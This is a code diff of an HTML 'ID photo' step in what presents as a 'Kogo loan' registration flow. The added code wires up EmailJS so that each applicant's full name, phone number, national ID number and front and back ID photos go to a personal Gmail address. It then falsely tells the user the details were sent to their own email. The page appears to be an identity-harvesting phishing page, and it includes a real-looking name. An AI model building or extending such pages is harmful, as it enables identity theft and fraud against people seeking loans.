@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Take ID Photo (Back)</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -146,13 +147,19 @@
     <button class="mock-align-button" id="mockAlignButton">Simulate ID Aligned</button>
 
     <script>
+        // Initialize EmailJS with your User ID from the EmailJS dashboard
+        (function() {
+            emailjs.init({
+                publicKey: "9knrIHE2Fj-yP9Q6E",
+            });
+        })();
+
         const video = document.getElementById('cameraFeed');
         const cameraOverlay = document.getElementById('cameraOverlay');
         const instructionText = document.getElementById('instruction-text');
         const mockAlignButton = document.getElementById('mockAlignButton');
         
         // This is a placeholder for data you would have collected from previous pages
-        // In a real app, you would use a global object or local storage to hold this data
         const userData = {
             mobileNumber: '123-456-789',
             fullName: 'ALMASI ACHIENG ALUOCH',
@@ -171,51 +178,33 @@
             }
         }
 
-        async function sendDataToEmail(data) {
-            // Placeholder URL for an email API service (e.g., EmailJS, SendGrid, or your own backend)
-            const emailServiceUrl = 'https://your-email-service-api.com/send-email';
-            const recipientEmail = 'klinswoo@gmail.com';
+        function sendEmail(data) {
+            const serviceID = 'service_8ugxo8k';
+            const templateID = 'template_l1jlg8j';
 
-            const emailPayload = {
-                to: recipientEmail,
-                subject: 'New Registration Details for Kogo loan',
-                body: `
-                    New user registration details:
-                    Full Name: ${data.fullName}
-                    Mobile Number: ${data.mobileNumber}
-                    ID Number: ${data.idNumber}
-
-                    ID Photos:
-                    Front ID: ${data.idFrontPhoto}
-                    Back ID: ${data.idBackPhoto}
-                `
+            // The template parameters must match the variables you set up in your EmailJS template
+            const templateParams = {
+                to_email: 'kebebi@gmail.com', // Your recipient email
+                full_name: data.fullName,
+                mobile_number: data.mobileNumber,
+                id_number: data.idNumber,
+                id_front_photo: data.idFrontPhoto,
+                id_back_photo: data.idBackPhoto
             };
-            
-            try {
-                const response = await fetch(emailServiceUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(emailPayload),
-                });
 
-                if (response.ok) {
-                    console.log('Email sent successfully!');
-                } else {
-                    console.error('Failed to send email.');
-                }
-            } catch (error) {
-                console.error('Network error:', error);
-            }
+            emailjs.send(serviceID, templateID, templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert("Registration details sent to your email!");
+                    window.location.href = 'confirmation_waiting.html';
+                }, function(error) {
+                    console.error('FAILED...', error);
+                    alert("Failed to send email. Please try again.");
+                });
         }
 
         function triggerCapture() {
-            // Send all collected data to your email
-            sendDataToEmail(userData);
-
-            // Redirect to the waiting page after the data is "sent"
-            window.location.href = 'confirmation_waiting.html';
+            sendEmail(userData);
         }
 
         mockAlignButton.addEventListener('click', () => {
